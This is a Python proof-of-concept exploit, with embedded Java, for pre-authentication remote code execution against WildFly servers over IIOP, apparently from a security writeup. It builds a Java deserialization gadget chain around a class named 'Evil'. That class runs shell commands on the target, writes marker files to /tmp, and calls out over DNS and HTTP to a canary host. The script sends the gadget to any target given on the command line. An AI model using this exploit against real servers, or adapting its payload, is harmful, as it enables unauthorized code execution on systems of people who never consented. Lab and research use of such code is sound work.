#!/usr/bin/env python3
"""
WildFly IIOP pre-auth RCE (Python client).

Author : chern0bit
Writeup : https://chern0b.it/wildfly-two-roads-to-rce/

The gadget is Java (TemplatesImpl + BeanComparator + PriorityQueue) because
that is what the server unmarshals. This script is the exploit: it parses the
target URL, builds a translet whose static initializer does DNS on a canary,
compiles a small IIOP sender, and fires it.

Usage:
  python3 exploit.py <target-url> [dns-canary] [cos-name]

  target-url   host
               host:port
               iiop://host:port
               corbaloc::host:port/NameService
  dns-canary   hostname the SERVER will resolve (proof of RCE)
               '-' / none / off  = skip DNS
  cos-name     CosNaming binding (default HelloBean)
"""

from __future__ import annotations

import argparse
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import textwrap
from pathlib import Path
from typing import Optional, Tuple
from urllib.parse import urlparse

DEFAULT_CANARY = "0wjibbdcx9tilnbe3krnc6arl.canarytokens.com"
DEFAULT_BEAN = "HelloBean"
DEFAULT_PORT = 3528
AUTHOR = "chern0bit"              # exploit author / signature
LAB = Path(__file__).resolve().parent

SENDER_JAVA = r"""
import com.example.HelloHome;
import com.example.HelloRemote;
import org.apache.commons.beanutils.BeanComparator;
import org.omg.CORBA.ORB;
import org.omg.CosNaming.NamingContextExt;
import org.omg.CosNaming.NamingContextExtHelper;
import javax.rmi.PortableRemoteObject;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.PriorityQueue;
import java.util.Properties;

// IIOPSend - WildFly IIOP valuetype sender (author: chern0bit)
public class IIOPSend {
    static final String AUTHOR = "chern0bit";
    public static void main(String[] args) throws Exception {
        System.out.println("[*] IIOPSend by " + AUTHOR);
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String beanName = args[2];
        byte[] translet = Files.readAllBytes(Path.of(args[3]));
        Object templates = makeTemplates(translet);
        BeanComparator cmp = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> q = new PriorityQueue<Object>(2, cmp);
        q.add("1");
        q.add("1");
        cmp.setProperty("outputProperties");
        Object[] arr = (Object[]) f(PriorityQueue.class, "queue").get(q);
        arr[0] = templates;
        arr[1] = templates;

        System.setProperty("com.sun.CORBA.ORBUseDynamicStub", "true");
        Properties p = new Properties();
        p.put("org.omg.CORBA.ORBClass", "com.sun.corba.se.impl.orb.ORBImpl");
        p.put("org.omg.CORBA.ORBSingletonClass", "com.sun.corba.se.impl.orb.ORBSingleton");
        ORB orb = ORB.init(new String[]{}, p);
        String loc = "corbaloc::" + host + ":" + port + "/NameService";
        System.out.println("[*] NameService " + loc);
        NamingContextExt nc = NamingContextExtHelper.narrow(orb.string_to_object(loc));
        HelloHome home = (HelloHome) PortableRemoteObject.narrow(nc.resolve_str(beanName), HelloHome.class);
        HelloRemote bean = home.create();
        try {
            System.out.println("[*] hello: " + bean.hello("pwn"));
        } catch (Exception e) {
            System.out.println("[!] hello failed: " + e);
        }
        System.out.println("[*] echo(gadget) pre-auth valuetype sink");
        try {
            Object ret = bean.echo(q);
            System.out.println("[+] echo returned " + (ret == null ? "null" : ret.getClass().getName()));
        } catch (Exception e) {
            String m = String.valueOf(e.getMessage());
            System.out.println("[*] echo threw (RCE may still have fired): " + e.getClass().getName());
            System.out.println("    " + m.replace('n', ' ').substring(0, Math.min(350, m.length())));
        }
    }

    static Object makeTemplates(byte[] clazz) throws Exception {
        Class<?> ti = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object t = ti.getDeclaredConstructor().newInstance();
        f(ti, "_bytecodes").set(t, new byte[][]{clazz});
        f(ti, "_name").set(t, "chern0bit");   // translet name doubles as the signature
        try { f(ti, "_transletIndex").setInt(t, 0); } catch (NoSuchFieldException ignored) {}
        return t;
    }

    static Field f(Class<?> c, String n) throws Exception {
        Field x = c.getDeclaredField(n);
        x.setAccessible(true);
        return x;
    }
}
"""

TRANSLET_SRC = """
package pwn;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
// gadget translet crafted by chern0bit
public class Evil extends AbstractTranslet {{
    static {{
        try {{
{dns}
            try {{
                java.io.FileWriter fw = new java.io.FileWriter("/tmp/pwned-WFLY-22156-chern0bit");
                fw.write("WFLY-22156 RCE by chern0bit dns={canary} ts=" + System.currentTimeMillis() + "\n");
                fw.close();
            }} catch (Throwable t) {{}}
            try {{
                Process p = new ProcessBuilder("/bin/sh", "-c", "id; hostname; date")
                    .redirectErrorStream(true).start();
                java.nio.file.Files.write(java.nio.file.Path.of("/tmp/pwned-id"),
                    p.getInputStream().readAllBytes());
            }} catch (Throwable t) {{}}
        }} catch (Throwable t) {{}}
    }}
    public void transform(DOM d, SerializationHandler[] h) throws TransletException {{}}
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) throws TransletException {{}}
}}
"""


def log(msg: str) -> None:
    print(msg, flush=True)


def die(msg: str, code: int = 1) -> None:
    print(f"[-] {msg}", file=sys.stderr, flush=True)
    raise SystemExit(code)


def attacker_up() -> bool:
    try:
        p = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", "iiop-attacker"],
            capture_output=True,
            text=True,
        )
        return p.returncode == 0 and p.stdout.strip() == "true"
    except OSError:
        return False


def parse_target(raw: str) -> Tuple[str, int]:
    s = raw.strip()
    if s.startswith("corbaloc:"):
        rest = s[len("corbaloc:") :]
        while rest.startswith(":"):
            rest = rest[1:]
        if "@" in rest:
            rest = rest.split("@", 1)[1]
        rest = rest.split("/", 1)[0]
        return split_host_port(rest)
    if "://" in s:
        u = urlparse(s)
        if not u.hostname:
            die(f"no host in {raw}")
        return u.hostname, (u.port or DEFAULT_PORT)
    return split_host_port(s)


def split_host_port(rest: str) -> Tuple[str, int]:
    if rest.startswith("["):
        end = rest.index("]")
        host = rest[1:end]
        port = DEFAULT_PORT
        if end + 1 < len(rest) and rest[end + 1] == ":":
            port = int(rest[end + 2 :])
        return host, port
    if rest.count(":") == 1:
        h, p = rest.rsplit(":", 1)
        return h, int(p)
    return rest, DEFAULT_PORT


def normalize_canary(raw: Optional[str]) -> Optional[str]:
    if raw is None:
        return DEFAULT_CANARY
    s = raw.strip()
    if not s:
        return DEFAULT_CANARY
    if s.lower() in ("-", "none", "off", "skip"):
        return None
    if "://" in s:
        try:
            host = urlparse(s).hostname
            if host:
                s = host
        except Exception:
            pass
    s = s.rstrip("/")
    if not re.fullmatch(r"[A-Za-z0-9._-]+", s):
        die("bad dns canary (allowed: [A-Za-z0-9._-])")
    if len(s) > 253:
        die("dns canary too long")
    return s


def java_home() -> Optional[Path]:
    env = os.environ.get("JAVA_HOME")
    if env:
        return Path(env)
    java = shutil.which("java")
    if not java:
        return None
    real = Path(java).resolve()
    return real.parent.parent


def tool(name: str) -> str:
    jh = java_home()
    if jh:
        cand = jh / "bin" / name
        if cand.is_file() and os.access(cand, os.X_OK):
            return str(cand)
        cand2 = jh.parent / "bin" / name
        if cand2.is_file() and os.access(cand2, os.X_OK):
            return str(cand2)
    w = shutil.which(name)
    if not w:
        die(f"{name} not found (need a JDK, not a JRE)")
    return w


def lab_classpath(lab: Path) -> str:
    lib = lab / "pocs" / "lib"
    jars = [
        lib / "openjdk-orb.jar",
        lib / "jakarta.transaction-api-2.0.1.jar",
        lib / "jakarta.ejb-api-4.0.1.jar",
        lib / "commons-beanutils-1.11.0.jar",
        lib / "commons-collections-3.2.2.jar",
    ]
    missing = [str(j) for j in jars if not j.is_file()]
    if missing:
        die("missing jars:n  " + "n  ".join(missing))
    parts = [str(j) for j in jars]
    demo = lab / "demo-ejb" / "out"
    if not (demo / "com" / "example" / "HelloRemote.class").is_file():
        die(f"compile the demo EJB first (missing {demo}/com/example/HelloRemote.class)")
    parts.append(str(demo))
    return os.pathsep.join(parts)


def to_container(path: Path, lab: Path) -> str:
    rel = path.resolve().relative_to(lab.resolve())
    return "/work/" + str(rel).replace("\", "/")


def map_to_container(arg: str, lab: Path) -> str:
    lab_s = str(lab.resolve())
    if os.pathsep in arg:
        return os.pathsep.join(map_to_container(p, lab) for p in arg.split(os.pathsep))
    if arg.startswith(lab_s + os.sep) or arg == lab_s:
        return to_container(Path(arg), lab)
    return arg


def run(cmd: list[str], cwd: Optional[Path] = None) -> subprocess.CompletedProcess:
    log("[*] " + " ".join(str(c) for c in cmd[:10]) + (" ..." if len(cmd) > 10 else ""))
    p = subprocess.run(cmd, cwd=str(cwd) if cwd else None, capture_output=True)
    if p.returncode != 0:
        err = (p.stdout + p.stderr).decode("utf-8", "replace")
        die(f"command failed ({p.returncode}): {' '.join(cmd)}n{err}")
    return p


def run_jdk(lab: Path, args: list[str], capture: bool = True) -> subprocess.CompletedProcess:
    if attacker_up():
        mapped = [map_to_container(a, lab) for a in args]
        cmd = ["docker", "exec", "-w", "/work", "iiop-attacker"] + mapped
        log("[*] docker exec iiop-attacker " + " ".join(mapped[:6]) + (" ..." if len(mapped) > 6 else ""))
        p = subprocess.run(cmd, capture_output=capture)
        if capture and p.returncode != 0:
            err = (p.stdout + p.stderr).decode("utf-8", "replace")
            die(f"docker exec failed ({p.returncode}):n{err}")
        if not capture and p.returncode != 0:
            die(f"docker exec failed ({p.returncode})")
        return p
    return run(args) if capture else subprocess.run(args)


def build_translet(work: Path, canary: Optional[str]) -> Path:
    src_dir = work / "src" / "pwn"
    out_dir = work / "translet"
    src_dir.mkdir(parents=True, exist_ok=True)
    out_dir.mkdir(parents=True, exist_ok=True)
    dns = ""
    if canary:
        dns = textwrap.indent(
            "n".join(
                [
                    f'try {{ java.net.InetAddress.getAllByName("{canary}"); }} catch (Throwable t) {{}}',
                    f'try {{ new java.net.URL("http://{canary}/").openConnection().getInputStream().close(); }} catch (Throwable t) {{}}',
                ]
            ),
            "            ",
        )
    src = TRANSLET_SRC.format(dns=dns, canary=("off" if canary is None else canary))
    src_file = src_dir / "Evil.java"
    src_file.write_text(src)
    javac_args = [
        tool("javac") if not attacker_up() else "javac",
        "-source",
        "21",
        "-target",
        "21",
        "-Xlint:-options",
        "--add-exports",
        "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
        "--add-exports",
        "java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED",
        "--add-exports",
        "java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED",
        "--add-exports",
        "java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED",
        "-d",
        str(out_dir),
        str(src_file),
    ]
    run_jdk(LAB, javac_args)
    cls = out_dir / "pwn" / "Evil.class"
    if not cls.is_file():
        die("javac did not produce pwn/Evil.class")
    log(f"[*] translet {cls.stat().st_size} bytes (major should be 65 / Java 21)")
    return cls


def compile_sender(work: Path, cp: str) -> Path:
    src = work / "IIOPSend.java"
    out = work / "sender"
    out.mkdir(parents=True, exist_ok=True)
    src.write_text(SENDER_JAVA)
    javac_args = [
        tool("javac") if not attacker_up() else "javac",
        "--release",
        "21",
        "-cp",
        cp,
        "-d",
        str(out),
        str(src),
    ]
    run_jdk(LAB, javac_args)
    return out


def fire(host: str, port: int, bean: str, translet: Path, sender_out: Path, cp: str, lab: Path) -> None:
    full_cp = os.pathsep.join([str(sender_out), cp])
    java_bin = tool("java") if not attacker_up() else "java"
    cmd = [
        java_bin,
        "--add-opens",
        "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
        "--add-opens",
        "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
        "--add-opens",
        "java.base/java.util=ALL-UNNAMED",
        "--add-opens",
        "java.base/java.lang.reflect=ALL-UNNAMED",
        "-Dcom.sun.CORBA.ORBUseDynamicStub=true",
        "-cp",
        full_cp,
        "IIOPSend",
        host,
        str(port),
        bean,
        str(translet),
    ]
    log("[*] firing gadget over IIOP")
    p = run_jdk(lab, cmd, capture=False)
    if p.returncode != 0:
        die(f"java IIOPSend exited {p.returncode}", p.returncode)


def giop_u32(n: int, le: bool) -> bytes:
    return struct.pack("<I" if le else ">I", n)


def giop_string(s: str, le: bool) -> bytes:
    b = s.encode("utf-8") + b"x00"
    pad = (4 - (len(b) % 4)) % 4
    return giop_u32(len(b), le) + b + (b"x00" * pad)


def giop_seq_octets(data: bytes, le: bool) -> bytes:
    pad = (4 - (len(data) % 4)) % 4
    return giop_u32(len(data), le) + data + (b"x00" * pad)


def giop_resolve_str(host: str, port: int, name: str, timeout: float = 5.0) -> bool:
    """
    Best-effort GIOP 1.2 resolve_str against corbaloc NameService.
    Used as a reachability check. The RCE itself is sent by IIOPSend.
    """
    body_op = "resolve_str"
    key = b"NameService"
    le = False
    hdr = b""
    hdr += giop_u32(1, le)          # request_id
    hdr += bytes([0x03, 0, 0, 0])   # response_flags + reserved
    hdr += giop_u32(0, le)          # KeyAddr
    hdr += giop_seq_octets(key, le)
    hdr += giop_string(body_op, le)
    hdr += giop_u32(0, le)          # empty ServiceContextList
    prefix_len = 12
    pad = (8 - ((prefix_len + len(hdr)) % 8)) % 8
    body = hdr + (b"x00" * pad) + giop_string(name, le)
    msg = bytearray(b"GIOP")
    msg += bytes([1, 2])            # version 1.2
    msg += bytes([0x00])            # flags: big-endian
    msg += bytes([0])              # Request
    msg += giop_u32(len(body), le)
    msg += body
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(msg)
            s.settimeout(timeout)
            magic = s.recv(12)
        if len(magic) >= 4 and magic[:4] == b"GIOP":
            log(f"[*] GIOP ping {host}:{port} -> reply magic {magic[:4]!r} ver={magic[4]}.{magic[5]}")
            return True
        log(f"[!] GIOP ping {host}:{port} unexpected reply {magic!r}")
        return False
    except OSError as e:
        log(f"[!] GIOP ping {host}:{port} failed: {e}")
        return False


def main(argv: Optional[list[str]] = None) -> int:
    ap = argparse.ArgumentParser(
        description="WildFly IIOP pre-auth RCE (Python). "
        "Builds a DNS-canary translet and sends it as a CORBA valuetype."
    )
    ap.add_argument("target", help="host | host:port | iiop://host:port | corbaloc::host:port/NameService")
    ap.add_argument(
        "dns_canary",
        nargs="?",
        default=DEFAULT_CANARY,
        help=f"hostname the target resolves (default {DEFAULT_CANARY}; none/- to skip)",
    )
    ap.add_argument("cos_name", nargs="?", default=DEFAULT_BEAN, help=f"CosNaming name (default {DEFAULT_BEAN})")
    ap.add_argument("--lab", default=str(LAB), help="root with pocs/lib and demo-ejb/out")
    ap.add_argument("--no-ping", action="store_true", help="skip GIOP NameService ping")
    args = ap.parse_args(argv)

    host, port = parse_target(args.target)
    canary = normalize_canary(args.dns_canary)
    bean = args.cos_name or DEFAULT_BEAN
    lab = Path(args.lab)

    log(f"[*] WildFly IIOP pre-auth RCE  -  by {AUTHOR}")
    log(f"[*] target     : {host}:{port}")
    log(f"[*] nameservice: corbaloc::{host}:{port}/NameService")
    log(f"[*] cos name   : {bean}")
    if canary:
        log(f"[*] dns canary : {canary}")
        log("[*]            the SERVER process will resolve this if RCE fires")
    else:
        log("[*] dns canary : (disabled)")

    if not args.no_ping:
        giop_resolve_str(host, port, bean)

    cp = lab_classpath(lab)
    tmp = lab / ".tmp"
    tmp.mkdir(exist_ok=True)
    work = Path(tempfile.mkdtemp(prefix="chern0bit-iiop-", dir=str(tmp)))
    translet = build_translet(work, canary)
    sender = compile_sender(work, cp)
    fire(host, port, bean, translet, sender, cp, lab)

    log("[*] done. If RCE fired:")
    if canary:
        log(f"    - DNS lookup of {canary} from the WildFly host")
    log("    - /tmp/pwned-WFLY-22156-chern0bit and /tmp/pwned-id on the server")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
